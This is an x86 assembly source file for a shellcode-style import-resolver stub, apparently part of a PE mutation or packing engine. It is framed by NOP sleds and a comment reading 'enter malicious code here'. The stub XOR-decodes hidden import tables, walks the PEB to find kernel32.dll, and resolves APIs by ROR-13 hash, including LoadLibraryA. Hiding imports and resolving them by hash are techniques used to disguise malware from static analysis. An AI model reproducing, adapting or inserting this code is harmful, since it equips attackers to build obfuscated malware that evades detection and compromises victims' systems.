global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_TO_ORIGINAL_IMPORTS> - offset from first byte after resolver to first byte of original imports
; <ADD_SUB>                    - "add" if imports are after resolver, "sub" otherwise
; <OFFSET_TO_EXILED_IMPORTS>   - offset from first byte after resolver to first byte of exiled imports
; <DECODER_KEY>                - decoder key
; <IMPORTS_SIZE>               - size of imports
; <BASE_ADDRESS>               - base address of mutated module
    
    jmp     store_resolver_end_addr
    
get_resolver_end_addr:
    pop     esi                                 ; esi = address of spared code
    mov     edi, esi                            ; edi = address of spared code
    xor     ebx, ebx                            ; ebx = 0
    mov     ebx, <OFFSET_TO_ORIGINAL_IMPORTS>   ; ebx = offset from first byte after resolver to first byte of original imports
    <ADD_SUB> esi, ebx                          ; esi = address of original imports
    xor     ebx, ebx                            ; ebx = 0
    mov     ebx, <OFFSET_TO_EXILED_IMPORTS>     ; ebx = offset from first byte after resolver to first byte of exiled imports
    add     edi, ebx                            ; edi = address of exiled imports
    xor     ebx, ebx                            ; ebx = 0

    mov     bl,  <DECODER_KEY>                  ; decoder key
    mov     ecx, <IMPORTS_SIZE>                 ; encoded imports size

decoder_loop:
    mov     edx, edi                            ; construct encoded byte address
    add     edx, ecx                            ;
    dec     edx                                 ;
    xor     byte [edx], bl                      ; decode
    loop    decoder_loop                        ; loop back
    xor     eax, eax                            ; eax = 0
    mov     ecx, <IMPORTS_SIZE>                 ; encoded imports size

copy_exiled_imports_loop:
    mov     al, [edi]                           ; memory-memory copy, phase 1
    mov     [esi], al                           ; memory-memory copy, phase 2
    inc     edi                                 ; increment addresses
    inc     esi                                 ;
    loop    copy_exiled_imports_loop            ; loop back
    mov     ebx, <IMPORTS_SIZE>                 ; ebx = size of original imports
    sub     esi, ebx                            ; esi = address of original imports
    xor     ebx, ebx                            ; ebx = 0
    
resolve_imports:
    call    get_kernel32_dll_base               ; eax = kernel32.dll base address
    push    ebp                                 ; save ebp
    xor     ebp, ebp                            ; ebp = 0
    
import_descriptors_loop:
    mov     edi, [esi]                          ; edi = RVA of OriginalFirstThunk (INT)
    test    edi, edi                            ; check if zero
    jz      restore_ebp
    add     esi, 0xc                            ; esi = address of DLL name RVA
    call    call_LoadLibraryA                   ; eax = base address of current DLL
    push    eax                                 ; push base address of current DLL
    mov     ecx, edi                            ; ecx = RVA of INT (Import Name Table)
    add     esi, 0x4                            ; esi = address of FirstThunk
    mov     ebp, [esi]                          ; edi = RVA of FirstThunk
    add     ecx, <BASE_ADDRESS>                 ; ecx = address of INT (Import Name Table)
    add     ebp, <BASE_ADDRESS>                 ; ebp = address of IAT (Import Address Table)
    push    esi                                 ; save esi
    
image_thunk_data_loop:
    xor     edi, edi                            ; edi = 0
    mov     edx, [ecx]                          ; edx = RVA of IMAGE_IMPORT_BY_NAME (AddressOfData) or function ordinal (Ordinal)
    test    edx, edx                            ; AddressOfData == 0?
    jz      next_import_descriptor
    push    edx                                 ; save edx
    and     edx, 0x80000000                     ; check if MSB is set (if yes, then function is imported by ordinal)
    pop     edx                                 ; restore edx
    jnz     import_function_by_ordinal
    add     edx, <BASE_ADDRESS>                 ; edx = address of IMAGE_IMPORT_BY_NAME
    add     edx, 0x2                            ; edx = imported function name
    mov     esi, edx                            ; esi = imported function name
    
compute_imported_function_hash:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                              ; al == 0
    jz      find_imported_function_address      ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                            ; hash >>= 13
    add     edi, eax                            ; hash += current name character
    jmp     compute_imported_function_hash
    
find_imported_function_address:
    mov     eax, edi                            ; eax = function hash
    pop     esi                                 ; restore esi
    push    eax                                 ; push function hash
    call    find_function                       ; eax = address of imported function
    add     esp, 0x4                            ; clear stack
    push    esi                                 ; save esi
    mov     [ebp], eax                          ; update imported function address in IAT
    
nexy_image_thunk_data:
    add     ecx, 0x4                            ; move to another IMAGE_THUNK_DATA in INT
    add     ebp, 0x4                            ; move to another IMAGE_THUNK_DATA in IAT
    jmp     image_thunk_data_loop

next_import_descriptor:
    pop     esi                                 ; restore esi
    add     esp, 0x4                            ; clear stack
    add     esi, 0x4                            ; esi = next IMAGE_IMPORT_DESCRIPTOR
    mov     eax, ebx                            ; eax = address of kernel32.dll
    jmp     import_descriptors_loop

import_function_by_ordinal:
    and     edx, 0x7FFFFFFF                     ; clear MSB, edx = function ordinal
    pop     esi                                 ; restore esi
    push    edx                                 ; push function ordinal
    call    find_function_by_ordinal
    add     esp, 0x4                            ; clear stack
    push    esi                                 ; save esi
    mov     [ebp], eax                          ; update imported function address in IAT
    jmp     nexy_image_thunk_data

call_LoadLibraryA:
;   HMODULE WINAPI LoadLibrary(
;       _In_  LPCTSTR lpFileName
;   );

    mov     ebx, eax                            ; ebx = kernel32.dll base address
    push    eax                                 ; push kernel32.dll base address
    push    dword 0xec0e4e8e                    ; push LoadLibraryA name hash
    call    find_function
    mov     ecx, [esi]                          ; ecx = RVA of current DLL name
    add     ecx, <BASE_ADDRESS>                 ; ecx = address of current DLL name
    push    ecx                                 ; lpFileName = current DLL name
    call    eax                                 ; call LoadLibraryA -> eax = current DLL base address
    add     esp, 0x8                            ; delete all variables from stack
    ret

get_kernel32_dll_base:
    push    ebp                                 ; save ebp
    push    esi                                 ; save esi
    mov     eax, [fs:0x30]                      ; eax = PEB
    mov     eax, [eax + 0xc]                    ; eax = Ldr
    mov     esi, [eax + 0x1c]                   ; esi = first entry in the initialization order module list
    lodsd                                       ; eax = second entry, which is kernel32.dll
    mov     ebp, [eax + 0x8]                    ; ebp = base address of kernel32.dll
    mov     eax, ebp                            ; eax = base address of kernel32.dll
    pop     esi                                 ; restore esi
    pop     ebp                                 ; restore ebp
    ret                                         ; jmp payload_body

find_function:
    push    ebx                                 ; save ebx
    push    ebp                                 ; save ebp
    push    esi                                 ; save esi
    push    edi                                 ; save edi
    push    ecx                                 ; save ecx
    mov     ebp, [esp + 0x1c]                   ; ebp = base address of DLL (module) to be loaded
    mov     eax, [ebp + 0x3c]                   ; eax = address of DLL's PE header (0x3c = offset to e_lfanew within DOS header)
    mov     edx, [ebp + eax + 0x7C]             ; edx = size of Export Directory
    push    edx                                 ; pass size of Export Directory as call parameter to is_function_forwarded
    mov     edx, [ebp + eax + 0x78]             ; edx = RVA of Export Directory (ebp + eax + 0x78 = first entry in Data Directory)
    add     edx, ebp                            ; edx = address of Export Directory
    mov     ecx, [edx + 0x18]                   ; ecx = number of functions exported by name (IMAGE_EXPORT_DIRECTORY::NumberOfNames)
    mov     ebx, [edx + 0x20]                   ; ebx = RVA of ENT (Export Name Table)
    add     ebx, ebp                            ; ebx = address of ENT

find_function_loop:
    jecxz   resolve_error                       ; if(ecx == 0) then last symbol was checked, nothing matches -> error
    dec     ecx                                 ; --ecx
    mov     esi, [ebx + ecx * 4]                ; esi = RVA of next exported symbol name
    add     esi, ebp                            ; esi = address of next exported symbol name
    xor     edi, edi                            ; edi = 0 (it will hold exported symbol name hash)
    cld                                         ; clear the direction flag to ensure that it increments instead of decrements when using the lods* instructions

compute_hash:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                              ; al == 0
    jz      check_hash                          ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                            ; hash >>= 13
    add     edi, eax                            ; hash += current name character
    jmp     compute_hash

check_hash:
    cmp     edi, [esp + 0x1C]                   ; hash == desired function hash
    jnz     find_function_loop                  ; hash doesn't match, check next symbol
    mov     ebx, [edx + 0x24]                   ; ebx = RVA of exported functions ordinals (IMAGE_EXPORT_DIRECTORY::AddressOfNameOrdinals)
    add     ebx, ebp                            ; ebx = address of exported functions ordinals
    mov     cx, [ebx + ecx * 2]                 ; cx = ordinal of function to be resolved (ecx = function index, 2 = sizeof(ordinal))
    mov     ebx, [edx + 0x1c]                   ; ebx = RVA of EAT (Export Address Table)
    add     ebx, ebp                            ; ebx = address of EAT
    mov     eax, [ebx + ecx * 4]                ; eax = RVA of desired function
    add     eax, ebp                            ; eax = address of desired function
    push    edx                                 ; pass Export Directory address as call parameter
    push    eax                                 ; pass imported function address as call parameter
    call    is_function_forwarded               ; if eax == 1: yes, if eax == 0: no
    test    eax, eax                            ; eax == 0?
    jz      function_not_forwarded
    call    find_forwarded_function
    jmp     function_is_forwarded

function_not_forwarded:
    pop     eax
    add     esp, 0x8                            ; clear stack from 3 call parameters
    jmp     find_function_finish
    
function_is_forwarded:
    add     esp, 0xC                            ; clear stack from 3 call parameters
    
find_function_finish:
    mov     edx, ebp                            ; edx = base address of DLL to be loaded
    pop     ecx                                 ; restore ecx
    pop     edi                                 ; restore edi
    pop     esi                                 ; restore esi
    pop     ebp                                 ; restore ebp
    pop     ebx                                 ; restore ebx
    ret

find_function_by_ordinal:
    push    ebx                                 ; save ebx
    push    ebp                                 ; save ebp
    push    esi                                 ; save esi
    push    edi                                 ; save edi
    push    ecx                                 ; save ecx
    mov     ebp, [esp + 0x1c]                   ; ebp = base address of DLL (module) to be loaded
    mov     eax, [ebp + 0x3c]                   ; eax = address of DLL's PE header (0x3c = offset to e_lfanew within DOS header)
    mov     edx, [ebp + eax + 0x78]             ; edx = RVA of Export Directory (ebp + eax + 0x79 = first entry in Data Directory)
    add     edx, ebp                            ; edx = address of Export Directory
    mov     ecx, [edx + 0x10]                   ; ecx = base ordinal number (IMAGE_EXPORT_DIRECTORY::Base)
    mov     ebx, [edx + 0x1c]                   ; ebx = RVA of EAT (Export Address Table)
    add     ebx, ebp                            ; ebx = address of EAT
    mov     esi, [esp + 0x18]                   ; esi = imported function ordinal
    sub     esi, ecx                            ; esi = imported function index in IAT
    mov     eax, [ebx + esi * 4]                ; eax = RVA of desired function
    add     eax, ebp                            ; eax = address of desired function
    pop     ecx                                 ; restore ecx
    pop     edi                                 ; restore edi
    pop     esi                                 ; restore esi
    pop     ebp                                 ; restore ebp
    pop     ebx                                 ; restore ebx
    ret

resolve_error:
    jmp resolve_error
    
is_function_forwarded:
    push    ebx                                 ; save ebx
    push    ecx                                 ; save ecx
    push    edx                                 ; save edx
    xor     eax, eax                            ; eax = 0
    mov     ebx, [esp + 0x10]                   ; ebx = function address to be checked
    mov     ecx, [esp + 0x14]                   ; ecx = Export Directory address
    mov     edx, [esp + 0x18]                   ; edx = Export Directory size
    cmp     ecx, ebx                            ; Export Directory start address - function address
    jg      is_function_forwarded_finish
    add     ecx, edx
    cmp     ecx, ebx                            ; Export Directory end address - function address
    jl      is_function_forwarded_finish
    mov     eax, 0x1                            ; eax = 1
    
is_function_forwarded_finish:
    pop     edx                                 ; restore edx
    pop     ecx                                 ; restore ecx
    pop     ebx                                 ; restore ebx
    ret
    
find_forwarded_function:
    push    ebx                                 ; save ebx
    push    ecx                                 ; save ecx
    push    edx                                 ; save edx
    push    esi                                 ; save esi
    push    edi                                 ; save edi
    mov     esi, [esp + 0x18]                   ; esi = address of FORWARDER_DLL.FORWARDER_FUNCTION ASCII string
    xor     ecx, ecx                            ; ecx = 0
    cld                                         ; clear the direction flag to ensure that it increments instead of decrementing when using the lods* instructions
    
count_dll_name_length:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, 0x2e                            ; al == '.'
    jz      load_forwarder_dll
    inc     ecx                                 ; ++ecx
    jmp     count_dll_name_length

load_forwarder_dll:
    mov     ebx, esi                            ; ebx = address of forwarder function name
    sub     esi, 0x2                            ; [esi] = last DLL name character
    std                                         ; set the direction flag to ensure that it decrements instead of incrementing when using the lods* instructions
    mov     edx, ecx                            ; length of buffer to be allocated
    inc     edx                                 ; include NULL character in buffer length
    dec     esp                                 ; allocate byte for NULL character
    mov     [esp], byte 0x0                     ; mark end of ASCII string
    
allocate_and_copy_dll_name:
    lodsb
    dec     esp                                 ; allocate byte for DLL name character
    mov     [esp], al                           ; copy DLL name character
    loop    allocate_and_copy_dll_name
    mov     ecx, edx                            ; ecx = length of buffer
    push    ecx                                 ; save ecx (LoadLibraryA doesn't preserve it!!!)
    call    get_kernel32_dll_base               ; eax = base address of kernel32.dll (required by call_LoadLibraryA
    push    eax                                 ; push kernel32.dll base address
    push    dword 0xec0e4e8e                    ; push LoadLibraryA name hash
    call    find_function
    add     esp, 0x8
    mov     ecx, esp                            ; ecx, esp
    add     ecx, 0x4                            ; ecx = address of DLL name
    push    ecx                                 ; lpFileName = forwarder DLL name
    call    eax                                 ; call LoadLibraryA -> eax = forwarder DLL base address
    pop     ecx                                 ; restore ecx
    add     esp, ecx                            ; deallocate buffer
    mov     esi, ebx                            ; esi = address of forwarder function name
    mov     edx, eax                            ; edx = forwarder DLL base address
    xor     edi, edi                            ; edi = 0 (for hash)
    
compute_forwarded_function_hash:
    xor     eax, eax                            ; eax = 0
    lodsb                                       ; load the byte pointed by esi (the current symbol name character) into al, ++esi
    cmp     al, ah                              ; al == 0
    jz      find_forwarded_function_address     ; if ZF is set, then end of the string has been reached -> jump hash checking
    ror     edi, 0xd                            ; hash >>= 13
    add     edi, eax                            ; hash += current name character
    jmp     compute_forwarded_function_hash
    
find_forwarded_function_address:
    push    edx                                 ; pass forwarder DLL base address as call parameter
    push    edi                                 ; pass forwarder function hash as call parameter
    call    find_function
    add     esp, 0x8                            ; clear stack
    pop     edi                                 ; restore edi
    pop     esi                                 ; restore esi
    pop     edx                                 ; restore edx
    pop     ecx                                 ; restore ecx
    pop     ebx                                 ; restore ebx
    ret
    
restore_ebp:
    pop     ebp                                 ; restore ebp
    jmp     next_engine
    
store_resolver_end_addr:
    call    get_resolver_end_addr
    
next_engine:
    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop